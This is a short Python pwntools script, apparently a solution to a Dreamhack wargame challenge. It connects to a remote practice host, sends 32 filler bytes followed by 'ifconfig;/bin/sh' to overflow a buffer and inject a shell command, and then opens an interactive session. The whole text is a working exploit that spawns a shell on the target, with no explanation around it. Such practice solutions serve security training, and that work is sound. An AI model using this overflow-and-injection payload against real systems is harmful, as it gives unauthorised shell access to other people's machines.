from pwn import *

r=remote("host1.dreamhack.games",16105)
print("remote success")

payload="A"*32+"ifconfig;/bin/sh"

r.send(payload)
r.interactive()
